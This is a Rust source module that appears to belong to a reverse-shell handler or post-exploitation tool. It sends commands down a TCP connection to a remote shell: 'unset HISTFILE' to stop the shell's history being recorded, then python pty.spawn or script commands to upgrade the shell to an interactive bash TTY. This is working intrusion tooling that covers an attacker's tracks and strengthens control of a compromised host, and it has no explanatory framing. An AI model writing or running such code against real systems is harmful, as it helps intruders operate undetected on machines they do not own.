use std::net::TcpStream;

use crate::connection::{recv_until_marker, send_command, send_raw};

pub fn disable_history(stream: &mut TcpStream) {
    println!("[i] Unsetting histfile...");
    send_raw(stream, "unset HISTFILE");
}

pub fn tty_upgrade(stream: &mut TcpStream) {
    println!("[i] Attempting TTY upgrade...");
    let tty_upgrade_commands = [
        (
            "python3",
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        ),
        ("python", "python -c 'import pty; pty.spawn(\"/bin/bash\")'"),
        ("script", "/usr/bin/script -qc /bin/bash /dev/null"),
    ];

    for (binary, upgrade_command) in tty_upgrade_commands {
        let check_binary_command = format!(
            "command -v {} >/dev/null 2>&1 && echo -n 1 || echo -n 0",
            binary
        );
        send_command(stream, &check_binary_command);
        let response = recv_until_marker(stream);
        if response.contains("1") {
            println!("[+] Binary '{}' is installed, upgrading shell...", binary);
            send_raw(stream, upgrade_command);
            return;
        } else {
            println!(
                "[-] {} is not installed or unexpected response: {}",
                binary, response
            );
        }
    }
    println!("[-] No binary available for a tty upgrade :/");
}
